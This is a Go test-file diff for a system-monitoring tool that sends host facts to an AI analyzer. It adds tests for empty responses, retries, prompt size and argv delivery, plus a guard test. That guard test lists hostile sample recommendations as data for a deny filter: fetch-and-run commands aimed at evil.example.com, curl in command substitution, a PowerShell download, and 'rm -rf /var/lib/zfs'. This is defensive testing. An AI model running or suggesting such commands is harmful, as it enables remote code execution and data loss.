@@ -62,7 +62,23 @@ type agyRecorder struct {
 	prompts []string
 }
 
+// stub scripts RunAgy with a sequence of MODEL RESPONSE texts (what used
+// to be the raw stub return value before --output-format json became
+// mandatory) — each is automatically wrapped in a valid SUCCESS envelope
+// so every existing call site keeps meaning "the model said this" without
+// needing to know about the envelope. Use stubRaw for tests that need to
+// control the envelope itself (e.g. the agy_empty case).
 func (r *agyRecorder) stub(responses ...string) func(ctx context.Context, o Options, promptPath, schemaPath string) ([]byte, error) {
+	wrapped := make([]string, len(responses))
+	for i, resp := range responses {
+		wrapped[i] = mustEnvelope(resp)
+	}
+	return r.stubRaw(wrapped...)
+}
+
+// stubRaw scripts RunAgy with raw bytes returned verbatim — no envelope
+// wrapping — for tests exercising envelope decoding itself.
+func (r *agyRecorder) stubRaw(responses ...string) func(ctx context.Context, o Options, promptPath, schemaPath string) ([]byte, error) {
 	return func(ctx context.Context, o Options, promptPath, schemaPath string) ([]byte, error) {
 		b, err := os.ReadFile(promptPath)
 		if err != nil {
@@ -76,6 +92,23 @@ func (r *agyRecorder) stub(responses ...string) func(ctx context.Context, o Opti
 		}
 		return []byte(responses[idx]), nil
 	}
+}
+
+// mustEnvelope wraps a model response text in a minimal valid
+// --output-format json envelope (status SUCCESS, non-zero input_tokens) —
+// the shape every real agy invocation now produces (§6 step 4).
+func mustEnvelope(response string) string {
+	b, err := json.Marshal(agyEnvelope{
+		Status:   "SUCCESS",
+		Response: response,
+		Usage: struct {
+			InputTokens int64 `json:"input_tokens"`
+		}{InputTokens: 1},
+	})
+	if err != nil {
+		panic(err) // fixture construction only ever fails on a Go bug
+	}
+	return string(b)
 }
 
 func mustJSON(t *testing.T, r report.Report) string {
@@ -1698,6 +1731,366 @@ func TestRun_RealAgy_CleanTick(t *testing.T) {
 	}
 	if _, verr := report.Validate(mustMarshal(t, rep)); verr != nil {
 		t.Fatalf("Validate() error: %v", verr)
+	}
+}
+
+// TestRun_RealAgy_BudgetSizedPromptGetsRealAnswer is the test obligation
+// from t4's live-validation round: only a real agy binary can catch a
+// stdin/argv mismatch or the antigravity-cli#76 silent-stdout-drop — a
+// stub can never fail this way, no matter how it's written, because it is
+// Go code that reads whatever the test hands it. This calls
+// DefaultDeps(cfg).RunAgy directly (bypassing Run's retry/fallback
+// machinery) against a realistic prompt sized near PROMPT_MAX_BYTES, and
+// asserts a non-empty response with non-zero input_tokens: proof the
+// prompt actually reached the model as an argv value and got answered,
+// not silently dropped.
+func TestRun_RealAgy_BudgetSizedPromptGetsRealAnswer(t *testing.T) {
+	if os.Getenv("SENTINEL_REAL_AGY") != "1" {
+		t.Skip("SENTINEL_REAL_AGY != 1: skipping the real-agy budget-sized prompt check")
+	}
+	if _, err := exec.LookPath("agy"); err != nil {
+		t.Skip("SENTINEL_REAL_AGY=1 but no \"agy\" binary on PATH: skipping")
+	}
+	cfg := newTestConfig(t)
+
+	f := factsWithLongCritEntries(1, 60) // large but realistic, well under FACTS_MAX_BYTES
+	prompt, err := buildStage1PromptWithinBudget(cfg, f, nil, "deadbeefdeadbeef")
+	if err != nil {
+		t.Fatalf("buildStage1PromptWithinBudget: %v", err)
+	}
+	if len(prompt) > cfg.PromptMaxBytes {
+		t.Fatalf("test setup: prompt is %d bytes, want <= PROMPT_MAX_BYTES (%d)", len(prompt), cfg.PromptMaxBytes)
+	}
+
+	promptPath := filepath.Join(cfg.TmpDir, "real-agy-budget-prompt.txt")
+	if err := os.WriteFile(promptPath, []byte(prompt), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	schemaPath := filepath.Join(cfg.TmpDir, "real-agy-budget-schema.json")
+	if err := os.WriteFile(schemaPath, report.SchemaJSON, 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	out, err := DefaultDeps(cfg).RunAgy(context.Background(), Options{Cfg: cfg}, promptPath, schemaPath)
+	if err != nil {
+		t.Fatalf("RunAgy against a real agy returned an error: %v", err)
+	}
+	var env agyEnvelope
+	if err := json.Unmarshal(out, &env); err != nil {
+		t.Fatalf("output is not a valid envelope: %v\n%s", err, out)
+	}
+	if env.Status != "SUCCESS" {
+		t.Fatalf("envelope status = %q, want SUCCESS", env.Status)
+	}
+	if strings.TrimSpace(env.Response) == "" {
+		t.Fatal("envelope response is empty — the antigravity-cli#76 silent-drop defect, or the prompt never reached agy")
+	}
+	if env.Usage.InputTokens == 0 {
+		t.Fatal("envelope input_tokens is 0 — the prompt did not actually reach the model")
+	}
+}
+
+// TestRun_AgyEmpty_ProducesFallback is main's exact reproduction: a stub
+// emitting {"status":"SUCCESS","response":"","usage":{"input_tokens":0}} —
+// the shape of the antigravity-cli#76 silent-stdout-drop — must produce
+// the fallback, not a crash and not a silent OK.
+func TestRun_AgyEmpty_ProducesFallback(t *testing.T) {
+	cfg := newTestConfig(t)
+	buf := captureLog(t)
+	rec := &agyRecorder{}
+	d := Deps{RunAgy: rec.stubRaw(`{"status":"SUCCESS","response":"","usage":{"input_tokens":0}}`)}
+
+	rep, err := Run(context.Background(), Options{Cfg: cfg, Facts: factsClean(1), Seq: 1}, d)
+	if err == nil {
+		t.Fatal("Run() expected a non-nil error for an empty envelope")
+	}
+	if rep == nil {
+		t.Fatal("Run() must still return a non-nil report")
+	}
+	if rep.Status != "ALERT" || rep.Headline != "Analyzer unavailable" {
+		t.Fatalf("expected the fallback document, got %+v", rep)
+	}
+	if !strings.Contains(rep.Body, "analyzer returned no answer") {
+		t.Fatalf("fallback body does not carry the agy_empty phrase: %q", rep.Body)
+	}
+	if _, verr := report.Validate(mustMarshal(t, rep)); verr != nil {
+		t.Fatalf("Validate() error: %v", verr)
+	}
+	if !strings.Contains(buf.String(), "reason=agy_empty") {
+		t.Fatalf("stderr does not contain reason=agy_empty: %s", buf.String())
+	}
+}
+
+// TestRun_AgyEmpty_RetriesFirst confirms agy_empty is retry-eligible
+// (interpretation flagged to main: the contract doesn't rule explicitly,
+// but a dropped-stdout retry is plausibly transient and cheap to attempt).
+// TestRun_AgyEmpty_TransientRetries is the retry-eligible agy_empty
+// sub-case (t4-review round 4 split, routed to main): status SUCCESS,
+// tokens spent, but an empty response — plausibly a transient
+// antigravity-cli#76 drop, worth one retry.
+func TestRun_AgyEmpty_TransientRetries(t *testing.T) {
+	cfg := newTestConfig(t)
+	rec := &agyRecorder{}
+	d := Deps{RunAgy: rec.stubRaw(
+		`{"status":"SUCCESS","response":"","usage":{"input_tokens":42}}`,
+		mustEnvelope(mustJSON(t, okReport())),
+	)}
+	rep, err := Run(context.Background(), Options{Cfg: cfg, Facts: factsClean(1), Seq: 1}, d)
+	if err != nil {
+		t.Fatalf("Run() unexpected error: %v", err)
+	}
+	if rec.calls != 2 {
+		t.Fatalf("agy call count = %d, want 2 (transient agy_empty must retry)", rec.calls)
+	}
+	if rep.Status != "OK" {
+		t.Fatalf("Status = %q, want OK (the successful retry's document)", rep.Status)
+	}
+}
+
+// TestRun_AgyEmpty_ZeroTokens_DoesNotRetry is the NOT-retry-eligible
+// agy_empty sub-case: input_tokens == 0 means the prompt never reached a
+// model that answered — exactly the argv-class bug this whole round
+// exists to catch. Retrying re-runs the identical broken invocation
+// (D7: "a retry cannot fix a dead binary"), so this must fail immediately,
+// not double the outage window.
+func TestRun_AgyEmpty_ZeroTokens_DoesNotRetry(t *testing.T) {
+	cfg := newTestConfig(t)
+	rec := &agyRecorder{}
+	// A non-empty response paired with zero tokens would still be
+	// systemic (the envelope itself says the model was never actually
+	// invoked) — assert the count-as-0-tokens rule fires regardless of
+	// response content, isolating it from the "response empty" check.
+	d := Deps{RunAgy: rec.stubRaw(`{"status":"SUCCESS","response":"a hallucinated answer","usage":{"input_tokens":0}}`)}
+
+	rep, err := Run(context.Background(), Options{Cfg: cfg, Facts: factsClean(1), Seq: 1}, d)
+	if err == nil {
+		t.Fatal("Run() expected a non-nil error")
+	}
+	if rec.calls != 1 {
+		t.Fatalf("agy call count = %d, want 1 (input_tokens==0 must not retry)", rec.calls)
+	}
+	if rep.Status != "ALERT" || rep.Headline != "Analyzer unavailable" {
+		t.Fatalf("expected the fallback document, got %+v", rep)
+	}
+}
+
+// TestRun_AgyEmpty_StatusFailed_DoesNotRetry is the other systemic
+// agy_empty sub-case: status != "SUCCESS".
+func TestRun_AgyEmpty_StatusFailed_DoesNotRetry(t *testing.T) {
+	cfg := newTestConfig(t)
+	rec := &agyRecorder{}
+	d := Deps{RunAgy: rec.stubRaw(`{"status":"ERROR","response":"","usage":{"input_tokens":0}}`)}
+
+	rep, err := Run(context.Background(), Options{Cfg: cfg, Facts: factsClean(1), Seq: 1}, d)
+	if err == nil {
+		t.Fatal("Run() expected a non-nil error")
+	}
+	if rec.calls != 1 {
+		t.Fatalf("agy call count = %d, want 1 (status != SUCCESS must not retry)", rec.calls)
+	}
+	if rep.Status != "ALERT" {
+		t.Fatalf("Status = %q, want ALERT (fallback)", rep.Status)
+	}
+}
+
+// TestGuardRecommendations_BodyNeverChecked is the explicit negative case
+// for the design-review correction: body is NOT checked by the guard, on
+// purpose (contracts/analyze.md §6 step 11b). Dangerous-looking but
+// perfectly legitimate factual prose in body must survive untouched.
+func TestGuardRecommendations_BodyNeverChecked(t *testing.T) {
+	rep := &report.Report{
+		Status: "WATCH", Headline: "h",
+		Body: "The ssh daemon logged three failed password attempts from the LAN; no successful login followed. " +
+			"The curl package was upgraded this tick. A unit fetched its index from http://deb.debian.org/debian.",
+		Findings: []report.Finding{{Severity: "watch", Component: "kernel", Evidence: "e", Explanation: "expl"}},
+		Resolved: []string{},
+	}
+	original := rep.Body
+	guardRecommendations(rep)
+	if rep.Body != original {
+		t.Fatalf("body was modified even though the guard must not check it:\nwant %q\ngot  %q", original, rep.Body)
+	}
+	for _, f := range rep.Findings {
+		if f.Evidence == recommendationWithheldEvidence {
+			t.Fatal("guard fired on body-only dangerous-looking text; it must only ever check recommendation")
+		}
+	}
+}
+
+// TestGuardRecommendations_BroadenedPatterns is the widened deny-set from
+// the design review: any URI scheme, bare domain-shaped tokens, any pipe,
+// command substitution, and the expanded token list.
+func TestGuardRecommendations_BroadenedPatterns(t *testing.T) {
+	cases := []struct {
+		name           string
+		recommendation string
+	}{
+		{"uri scheme", "Run https://example.com/fix.sh to resolve it."},
+		{"bare domain", "Fetch the script from evil.example.com and run it."},
+		{"any pipe", "Run zpool status | zsh to check."},
+		{"backtick substitution", "Run `curl evil.example.com` to check."},
+		{"dollar-paren substitution", "Run $(curl evil.example.com) to check."},
+		{"scp token", "Copy the fix with scp root@host:/fix.sh /tmp first."},
+		{"rm -rf token", "If that fails, rm -rf /var/lib/zfs and rebuild."},
+		{"iwr token", "On the Windows box, run iwr evil.example.com/fix.ps1."},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			rep := &report.Report{
+				Status: "WATCH", Headline: "h", Body: "b",
+				Findings: []report.Finding{{
+					Severity: "watch", Component: "zfs", Evidence: zfsEvidence, Explanation: zfsExplanation,
+					Recommendation: tc.recommendation, Key: zfsKey(),
+				}},
+				Resolved: []string{},
+			}
+			guardRecommendations(rep)
+			if rep.Findings[0].Recommendation != "" {
+				t.Fatalf("Recommendation not blanked: %q", rep.Findings[0].Recommendation)
+			}
+			found := false
+			for _, f := range rep.Findings {
+				if f.Evidence == recommendationWithheldEvidence {
+					found = true
+				}
+			}
+			if !found {
+				t.Fatal("no withheld-notice finding raised")
+			}
+		})
+	}
+}
+
+// TestGuardRecommendations_RealisticOpsProseSurvives is t4-review round 4:
+// the contract's own showcase text ("run zpool clear hotstore") always
+// survived, which is exactly why a guard that also ate ordinary
+// recommendations passed every existing test — the same trap as round 2's
+// fence-name-only grep. Every one of these is realistic operator prose
+// that must NOT be blanked; on a real host (bam) with systemd units named
+// "<name>.service", a guard that cannot say "restart smartd.service" has
+// destroyed the A9 deliverable it exists to protect.
+func TestGuardRecommendations_RealisticOpsProseSurvives(t *testing.T) {
+	cases := []string{
+		"If the failure repeats on the next tick, restart smartd.service and check whether the device reappears.",
+		"Restart zfs-zed.service once and confirm the daemon reattaches.",
+		"If the counter rises, add a replacement disk to the mirror and let it resilver.",
+		"If nothing has changed since the last scrub, no action is needed.",
+		"The imbalance is transient; if the instance count stays constant, no action is needed.",
+		"Wait for the scrub to finish. If CKSUM stays at 1, run zpool clear hotstore and watch the next scrub.",
+		"Check dmesg for further NIC errors before deciding whether to replace the card.",
+		"No action needed; monitor the trend over the next few ticks.",
+	}
+	for _, recommendation := range cases {
+		t.Run(recommendation, func(t *testing.T) {
+			rep := &report.Report{
+				Status: "WATCH", Headline: "h", Body: "b",
+				Findings: []report.Finding{{
+					Severity: "watch", Component: "zfs", Evidence: zfsEvidence, Explanation: zfsExplanation,
+					Recommendation: recommendation, Key: zfsKey(),
+				}},
+				Resolved: []string{},
+			}
+			guardRecommendations(rep)
+			if rep.Findings[0].Recommendation != recommendation {
+				t.Fatalf("legitimate recommendation was blanked: %q", recommendation)
+			}
+			for _, f := range rep.Findings {
+				if f.Evidence == recommendationWithheldEvidence {
+					t.Fatalf("guard fired on legitimate ops prose: %q", recommendation)
+				}
+			}
+		})
+	}
+}
+
+// TestBuildStage1PromptWithinBudget_ReducesOversizedFacts is §6 step 3:
+// PROMPT_MAX_BYTES bounds the WHOLE assembled prompt, not the facts alone.
+// A facts document that would blow the budget must be rendered against a
+// reduced copy, not the original — leaving the final prompt within budget
+// and its FACTS section showing meta.truncated.
+func TestBuildStage1PromptWithinBudget_ReducesOversizedFacts(t *testing.T) {
+	cfg := newTestConfig(t) // default PROMPT_MAX_BYTES (20000)
+	f := factsWithLongCritEntries(1, 500)
+
+	unreduced, err := json.Marshal(f)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(unreduced) <= cfg.PromptMaxBytes {
+		t.Fatalf("test setup: unreduced facts (%d bytes) must exceed PromptMaxBytes (%d) for this test to mean anything", len(unreduced), cfg.PromptMaxBytes)
+	}
+
+	prompt, err := buildStage1PromptWithinBudget(cfg, f, nil, "deadbeefdeadbeef")
+	if err != nil {
+		t.Fatalf("buildStage1PromptWithinBudget: %v", err)
+	}
+	if len(prompt) > cfg.PromptMaxBytes {
+		t.Fatalf("prompt is %d bytes, exceeds PromptMaxBytes %d", len(prompt), cfg.PromptMaxBytes)
+	}
+	if !strings.Contains(prompt, `"truncated":true`) {
+		t.Fatalf("reduced facts in the prompt do not show meta.truncated=true:\n%s", prompt)
+	}
+
+	// The original facts pointer must be untouched (D2/§6 step 3: "the
+	// UNREDUCED facts remain what collect emits and what the raw-alert
+	// path reads").
+	stillUnreduced, err := json.Marshal(f)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(stillUnreduced) != string(unreduced) {
+		t.Fatal("the original facts were mutated by the prompt-budget reduction — only a copy may be touched")
+	}
+}
+
+// TestRun_DefaultDeps_PromptReachesArgv is a hermetic reproduction of the
+// exact live-validation defect: a stub `agy` on PATH that only answers
+// when its prompt arrives via argv (never stdin) proves DefaultDeps'
+// RunAgy passes the prompt the right way without needing a real agy
+// binary or SENTINEL_REAL_AGY. Complements TestRun_RealAgy_* (which prove
+// a REAL agy answers correctly) by pinning the exact exec.Cmd shape.
+func TestRun_DefaultDeps_PromptReachesArgv(t *testing.T) {
+	cfg := newTestConfig(t)
+	binDir := t.TempDir()
+	// The check is keyed to the per-run NONCE, not a fixed literal (t4-review
+	// round 4: a fixed marker like "SECURITY BOUNDARY" only proves "some
+	// text reached argv" — feeding the stub nothing but that literal string
+	// still passed). The nonce is unguessable and unique per Run() call, so
+	// extracting it from the opening <<<FACTS_...>>> fence and confirming
+	// the SAME nonce closes it proves three things at once: the real
+	// prompt reached argv, it is THIS run's prompt, and the fence
+	// structure survived intact (not truncated, not a stale/wrong value).
+	stub := `#!/bin/sh
+prompt=""
+while [ $# -gt 0 ]; do
+  case "$1" in
+    --print) prompt="$2"; shift 2 ;;
+    *) shift ;;
+  esac
+done
+nonce=$(printf '%s' "$prompt" | grep -oE '<<<FACTS_[0-9a-f]{16}>>>' | head -1 | sed -E 's/<<<FACTS_([0-9a-f]{16})>>>/\1/')
+if [ -n "$nonce" ] && printf '%s' "$prompt" | grep -q "<<<END_FACTS_${nonce}>>>"; then
+  printf '{"status":"SUCCESS","response":"argv-ok","usage":{"input_tokens":1}}'
+else
+  printf '{"status":"SUCCESS","response":"","usage":{"input_tokens":0}}'
+fi
+`
+	stubPath := filepath.Join(binDir, "agy")
+	if err := os.WriteFile(stubPath, []byte(stub), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	cfg.AgyBin = stubPath
+
+	rep, err := Run(context.Background(), Options{Cfg: cfg, Facts: factsClean(1), Seq: 1}, DefaultDeps(cfg))
+	// The stub's response ("argv-len=N") is not valid report JSON, so this
+	// ends in the fallback either way — the assertion that matters is
+	// WHICH reason, proving the prompt reached argv non-empty rather than
+	// being silently dropped (which would produce agy_empty).
+	if err == nil {
+		t.Fatal("Run() expected a non-nil error (the stub's response is not report JSON)")
+	}
+	if strings.Contains(rep.Body, "reason: analyzer returned no answer") {
+		t.Fatalf("stub reported an empty prompt — the prompt did not reach argv:\n%s", rep.Body)
 	}
 }
 
